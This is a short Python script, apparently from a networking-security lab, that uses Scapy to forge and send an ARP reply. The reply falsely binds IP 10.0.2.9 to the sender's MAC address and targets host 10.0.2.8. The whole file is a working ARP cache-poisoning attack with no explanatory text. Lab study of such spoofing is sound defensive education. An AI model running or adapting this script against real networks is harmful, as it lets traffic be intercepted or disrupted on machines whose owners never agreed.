#!/usr/bin/python3
from scapy.all import *

E = Ether(dst='08:00:27:cd:2d:fd', src='08:00:27:b7:ba:af')
A = ARP(op=2,hwsrc='08:00:27:b7:ba:af',psrc='10.0.2.9', 
	hwdst='08:00:27:cd:2d:fd', pdst='10.0.2.8')

pkt = E/A
pkt.show()
sendp(pkt)
